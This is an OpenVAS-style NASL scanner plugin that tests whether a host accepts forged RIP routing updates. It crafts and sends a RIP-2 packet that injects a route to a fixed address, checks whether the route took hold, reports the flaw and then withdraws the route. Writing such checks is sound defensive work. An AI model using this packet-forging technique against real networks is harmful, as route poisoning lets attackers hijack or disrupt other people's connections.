if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11829" );
	script_version( "2020-11-10T09:46:51+0000" );
	script_tag( name: "last_modification", value: "2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_name( "RIP poisoning" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2003 Michel Arboi" );
	script_family( "General" );
	script_dependencies( "rip_detect.sc" );
	script_require_udp_ports( "Services/udp/rip", 520 );
	script_mandatory_keys( "RIP/detected" );
	script_tag( name: "solution", value: "Use RIP-2 and implement authentication,
  or use another routing protocol, or disable the RIP listener if you don't need it." );
	script_tag( name: "summary", value: "It was possible to poison the remote host routing tables through
  the RIP protocol." );
	script_tag( name: "impact", value: "An attacker may use this to hijack network connections." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
a1 = 192;
a2 = 0;
a3 = 34;
a4 = 166;
func check_example_com( port ){
	var r, l, ver, i, soc, broken;
	broken = get_kb_item( "/rip/" + port + "/broken_source_port" );
	if( broken ) {
		soc = open_priv_sock_udp( dport: port, sport: port );
	}
	else {
		soc = open_sock_udp( port );
	}
	if(!soc){
		return ( 0 );
	}
	req = raw_string( 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16 );
	send( socket: soc, data: req );
	r = recv( socket: soc, length: 512 );
	close( soc );
	l = strlen( r );
	if(l < 4 || ord( r[0] ) != 2){
		return ( 0 );
	}
	ver = ord( r[1] );
	if(ver != 1 && ver != 2){
		return ( 0 );
	}
	for(i = 4;i < l;i += 20){
		fam = 256 * ord( r[i] ) + ord( r[i + 1] );
		if(fam == 2){
			if(ord( r[i + 4] ) == a1 && ord( r[i + 5] ) == a2 && ord( r[i + 6] ) == a3 && ord( r[i + 7] ) == a4 && ord( r[i + 16] ) == 0 && ord( r[i + 17] ) == 0 && ord( r[i + 18] ) == 0 && ord( r[i + 19] ) != 16){
				return 1;
			}
		}
	}
	return 0;
}
port = service_get_port( default: 520, proto: "rip", ipproto: "udp" );
if(check_example_com( port: port )){
	exit( 0 );
}
soc = open_priv_sock_udp( sport: port, dport: port );
if(!soc){
	exit( 0 );
}
req = raw_string( 2, 1, 0, 0, 0, 2, 0, 0, a1, a2, a3, a4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 14 );
send( socket: soc, data: req );
if(check_example_com( port: port )){
	security_message( port: port, protocol: "udp" );
	if(!islocalnet()){
		security_message( port: port, protocol: "udp", data: "Your RIP listener accepts routes that are not sent by a neighbour.
This cannot happen in the RIP protocol as defined by RFC2453, and although the RFC is silent on this point, such routes should probably
be ignored." );
	}
	req = raw_string( 2, 1, 0, 0, 0, 2, 0, 0, a1, a2, a3, a4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16 );
	send( socket: soc, data: req );
}
close( soc );

